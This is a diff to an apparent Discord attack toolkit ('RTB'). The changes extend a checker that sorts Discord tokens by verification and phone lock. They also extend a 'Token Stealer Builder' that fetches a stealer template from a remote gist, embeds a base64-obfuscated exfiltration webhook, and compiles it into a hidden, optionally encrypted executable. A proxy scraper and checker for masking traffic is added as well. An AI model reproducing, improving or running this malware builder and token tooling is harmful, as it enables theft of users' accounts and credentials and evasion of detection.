@@ -698,7 +698,7 @@ elif mode == "checker":
             with open ("tokens/"+token_list,"w+") as handle:
                 handle.write(vlist)
                 sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
-        elif event == "Stop":
+        elif event == "Stop Checking":
             executor.shutdown(wait=False)
     window.Close()
 
@@ -745,14 +745,21 @@ elif mode == "checkerV2":
                     phonelocked.append(token)
             else:
                 if response["verified"]:
-                    printqueue.append(f"[VERIFIED]: {token}")
+                    if response["phone"] is not None:
+                        printqueue.append(f"[VERIFIED (E & P)]: {token}")
+                    else:
+                        printqueue.append(f"[VERIFIED (E)]: {token}")
                     verifiedtokens.append(token)
                 else:
-                    printqueue.append(f"[UNVERIFIED]: {token}")
-                    unverifiedtokens.append(token)
+                    if response["phone"] is not None:
+                        printqueue.append(f"[VERIFIED (P)]: {token}")
+                        verifiedtokens.append(token)
+                    else:
+                        printqueue.append(f"[UNVERIFIED]: {token}")
+                        unverifiedtokens.append(token)
     layout = [
         [sg.Output(size=(100,30))],
-        [sg.Button('Save Working',button_color=theme['button_colour'],size=(10,1))]
+        [sg.Button('Save Working',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Stop Checking',button_color=theme['button_colour'],size=(15,1))]
     ]
     for token in tokenlist:
         executor.submit(checkv2, token)
@@ -769,10 +776,13 @@ elif mode == "checkerV2":
             window.TKroot.title(f'RTB | Checker V2 [{len(verifiedtokens)} Verified] [{len(unverifiedtokens)} Unverified] [{len(phonelocked)} Phone Locked] [{len(invalidtokens)} Invalid]')
         elif event is None:
             break
-        elif event == "Save working":
-            if not os.path.isdir("tokens/old"):
-                os.mkdir("tokens/old")
-            shutil.copyfile("tokens/"+token_list, f'tokens/old/{token_list.replace(".txt","")}old{random.randint(1,999)}.txt')
+        elif event == "Save Working":
+            try:
+                if not os.path.isdir("tokens/old"):
+                    os.mkdir("tokens/old")
+                shutil.copyfile("tokens/"+token_list, f'tokens/old/{token_list.replace(".txt","")}old{random.randint(1,999)}.txt')
+            except Exception:
+                pass
             time.sleep(0.1)
             with open ("tokens/"+token_list,"w+") as handle:
                 for token in verifiedtokens:
@@ -780,6 +790,8 @@ elif mode == "checkerV2":
                 for token in unverifiedtokens:
                     handle.write(f"{token}\n")
                 sg.PopupOK('Saved', title="RTB | Saved tokens", keep_on_top=True)
+        elif event == "Stop Checking":
+            executor.shutdown(wait=False)
     window.Close()
 
 
@@ -2421,27 +2433,28 @@ elif mode == 'quickcheck': # Legacy Shit
                 handle.write(token+"\n")
 
 elif mode == "StealerBuilder":
-    if not sys.platform.startswith("win32"):
-        sg.Popup("Only Supported on windows for now. Sorry.", title="Yikes")
-        os.kill(os.getpid(), 15)
+    import PyInstaller.__main__
+    if sys.platform.startswith("linux"):
+        sg.Popup("Linux isn't supported yet.")
+        sys.exit()
     if not os.path.exists("RTBStealerBuilder/"):
         os.mkdir("RTBStealerBuilder/")
     def build():
         global name
         global webhook
         global useicon
+        global encrypt
         global icon
         global Window
         global runonce
         global killdisc
-        e = subprocess.call(['pyinstaller','-h'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
-        if e == 1:
-            print("Pyinstaller is not installed!")
-            window.Refresh()
-        else:
+        try:
             os.chdir('RTBStealerBuilder/')
             pyname = name+'.py'
-            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/0bb4d7dc9eddd26568b7afe39069a0f7af40cb8f/stealertemplate.py").text
+            if sys.platform.startswith("win32"):
+                temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplate.py").text
+            elif sys.platform.startswith("darwin"):
+                temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/f4bef215dfdece01d0d049afe5aa5680c24a9f19/stealertemplatemac.py").text
             with open("template.py", "w+") as handle:
                 handle.write(temp)
             with open("template.py") as f:
@@ -2449,40 +2462,55 @@ elif mode == "StealerBuilder":
             os.remove("template.py")
             with open(pyname, "w") as f:
                 list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), str(uuid.uuid4())]
-                lines.insert(11, f"a = {str(list_string)}")
+                if sys.platform.startswith("win32"):
+                    lines.insert(11, f"a = {str(list_string)}")
+                elif sys.platform.startswith("darwin"):
+                    lines.insert(14, f"a = {str(list_string)}")
                 f.write("".join(lines))
             print("Building EXE, Please wait...")
-            window.Refresh()
-            if useicon:
-                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
-            else:
-                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
-            compiling.wait()
-            print("EXE built, Cleaning up...")
-            window.Refresh()
-            shutil.rmtree('build')
-            for root, dirs, files in os.walk('dist'):
-                for file in files:
-                    if file == ('{}.exe'.format(name)):
-                        os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
-            shutil.rmtree('dist')
-            os.remove('{}.spec'.format(name))
-            print("Finished!")
-            window.Refresh()
-    layout = [
-            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
-            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
-            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1))],
-            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Checkbox('', default=True, key="Run", tooltip="Only Run once per PC to prevent spam."), sg.Text('Close Discord', size=(10, 1)), sg.Checkbox('', default=False, key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)"), sg.Text('Base64 Cycles', size=(10, 1)), sg.Spin([i for i in range(0,50)], initial_value=1, key="Cycles", tooltip="More Cycles = Bigger and slower file"),  sg.Checkbox('Use Icon', key="Useicon")],
-            [sg.Output(size=(80, 15))],
-            [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
+            arg = [
+                '--onefile',
+                '--noconsole',
+                '--distpath=Executable',
             ]
-    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.2.0", layout)
+            if useicon:
+                arg.append(f'--icon={icon}')
+            if encrypt:
+                arg.append(f'--key={str(uuid.uuid4())}')
+            arg.append(pyname)
+            PyInstaller.__main__.run(arg)
+            print("EXE built, Cleaning up...")
+            os.chdir("..")
+            shutil.rmtree('build')
+            os.remove(f'{name}.spec')
+            print("Finished!")
+        except Exception as e:
+            print(e)
+        window['Build'].Update(disabled=False)
+
+
+    layout = [
+        [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1), key="namea")],
+        [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1), key="Webhook"), sg.Button('Test', size=(6,1))],
+        [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1), key="iconpath"), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")), size=(6,1), key="IconBrowse")],
+        [sg.Text('Run Once Per PC', size=(13, 1)), sg.Checkbox('', default=True, key="Run", tooltip="Only Run once per PC to prevent spam."), sg.Text('Close Discord', size=(10, 1)), sg.Checkbox('', default=False, key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)"), sg.Text('Base64 Cycles', size=(10, 1)), sg.Spin([i for i in range(0,50)], initial_value=1, key="Cycles", tooltip="More Cycles = Bigger and slower file"),  sg.Checkbox('Use Icon', key="Useicon"), sg.Checkbox('Encrypt', key="Encrypt", tooltip="Encrypt the Python ByteCode (PyCrypto needed; pip install pycryptodome, but beware: it will make the compiled exe 40+ MB)")],
+        [sg.Output(size=(80, 15))],
+        [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
+    ]
+    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.3.0", layout)
     while True:
-        event, values = window.Read(timeout=0)
+        event, values = window.Read(timeout=10)
         if event is None or event == 'Exit':
             break
         elif event == sg.TIMEOUT_KEY:
+            if not values['Useicon']:
+                window['iconpath'].Update(disabled=True)
+                window['IconBrowse'].Update(disabled=True)
+            else:
+                window['iconpath'].Update(disabled=False)
+                window['IconBrowse'].Update(disabled=False)
+            if not sys.platform.startswith("win32"):
+                window['Close'].Update(disabled=True)
             window.Refresh()
         elif event == "Test":
             payload = {
@@ -2521,9 +2549,12 @@ elif mode == "StealerBuilder":
             icon = values["iconpath"]
             runonce = values['Run']
             killdisc = values['Close']
+            encrypt = values['Encrypt']
             for x in range(cycles):
                 webhook = base64.b64encode(webhook)
-            build()
+            t = threading.Thread(target=build)
+            t.start()
+            window['Build'].Update(disabled=True)
     window.Close()
 
 elif mode == "InfoToken":
@@ -3017,6 +3048,104 @@ elif mode == "FR Clearer":
     for relation in relations:
         if relation['type'] == 3:
             executor.submit(delete, relation['id'])
+
+elif mode == "ProxyScraper":
+    import re
+    printqueue = []
+    def scrape_proxies():
+        if not os.path.isdir("proxies"):
+            os.mkdir("proxies")
+        proxies = []
+        proxyregex = "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,4}" # Really happy with this for some reason
+        links = requests.get("https://gist.githubusercontent.com/DeadBread76/608c733168cb808783d2024def3ea736/raw/d69dfdbda65bfaa8612d8d55b98d8a4971fcf213/Proxy%2520Sources%2520(Stolen%2520from%2520Proxyscrape%2520Scraper%2520lol).txt").text.split("\n")
+        linkno = 0
+        name = datetime.now().strftime("%m-%d-%Y %H-%M-%S")
+        print("Started Scraping!")
+        for link in links:
+            linkno += 1
+            print(f"Checking Link {linkno}/{len(links)}")
+            try:
+                src = requests.get(link, timeout=5)
+            except:
+                continue
+            prox = re.findall(proxyregex, src.text)
+            for proxy in prox:
+                if proxy in proxies:
+                    continue
+                else:
+                    proxies.append(proxy)
+            print(f"Found {len(prox)} proxies on {link} ({len(proxies)} total.)", end='\n')
+        print("Writing to file...")
+        with open(f"proxies/{name}.txt", "w+") as handle:
+            for proxy in proxies:
+                handle.write(f"{proxy}\n")
+        print("Wrote Proxies to file")
+        window['ScrapeButton'].Update(disabled=False)
+        window['Checkbutton'].Update(disabled=False)
+        window['ProxyListPath'].Update(disabled=False)
+        print(f'Done Scraping! You can now check them by selecting the text file in proxies/{name}.txt')
+
+    def check_proxy(proxy, timeout, list):
+        try:
+            try:
+                requests.get("https://www.google.com/", timeout=timeout, proxies={"https": proxy, "http": proxy})
+            except Exception:
+                printqueue.append(f"[{proxy}]: Dead or timed out.")
+            else:
+                printqueue.append(f"[{proxy}]: Working")
+                name = list.split("/")[-1].split(".")[0]
+                with open(f"proxies/{name}-working.txt", "a+") as handle:
+                    handle.write(f"{proxy}\n")
+        except Exception as e:
+            print(e, end='\n', flush=True)
+    def check_proxies(timeout, list, threads):
+        if not os.path.isdir("proxies"):
+            os.mkdir("proxies")
+        proxylist = open(list).read().splitlines()
+        with ThreadPoolExecutor(max_workers=threads) as exe:
+            for proxy in proxylist:
+                exe.submit(check_proxy, proxy, timeout, list)
+
+
+    layout = [
+        [sg.Output(size=(100, 20))],
+        [sg.Button("Scrape Proxies", size=(15,1), key="ScrapeButton"), sg.Input(key="ProxyListPath"), sg.FileBrowse(file_types=(("Text Files", "*.txt"),("All Files", "*.*"))), sg.Button("Check", key="Checkbutton"), sg.Text("Timeout (In Seconds):"), sg.Spin([x + 1 for x in range(500)], 10, key='TimeOut')]
+    ]
+    window = sg.Window("RTB | Proxy Scraper/Checker", resizable=False, auto_size_buttons=True).Layout(layout)
+    while True:
+        event, values = window.Read(timeout=10)
+        if event is None:
+            os.kill(os.getpid(), 9)
+        elif event == sg.TIMEOUT_KEY:
+            for p in printqueue:
+                print(p)
+                printqueue.remove(p)
+        elif event == "ScrapeButton":
+            t = threading.Thread(target=scrape_proxies, daemon=True)
+            t.start()
+            window['ScrapeButton'].Update(disabled=True)
+            window['Checkbutton'].Update(disabled=True)
+            window['ProxyListPath'].Update(disabled=True)
+        elif event == "Checkbutton":
+            while True:
+                thr = sg.PopupGetText("Number of Threads? (Default 500)", title="Threads")
+                if thr == "":
+                    thr = 500
+                if thr == 'Cancel':
+                    break
+                try:
+                    thr = int(thr)
+                except:
+                    sg.Popup("Not a Number.")
+                else:
+                    break
+            try:
+                t = threading.Thread(target=check_proxies, args=[values['TimeOut'], values['ProxyListPath'], thr], daemon=True)
+                t.start()
+            except Exception:
+                pass
+
+
 
 elif mode == "CPUWIDGET":
     # Thank you PySimpleGUI, Very Cool!
